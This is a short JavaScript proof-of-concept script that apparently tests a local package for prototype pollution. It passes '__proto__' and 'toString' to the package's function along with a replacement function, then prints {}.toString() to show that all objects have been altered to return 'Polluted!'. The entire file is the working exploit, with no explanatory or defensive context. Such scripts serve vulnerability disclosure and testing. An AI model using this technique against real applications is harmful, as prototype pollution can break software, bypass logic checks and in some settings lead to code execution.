const f = require("./package/code")

const obj = {}
const key = '__proto__'
const sub_key = 'toString'
const value = function() { return "Polluted!"}

f(obj, key, sub_key, value)

console.log({}.toString())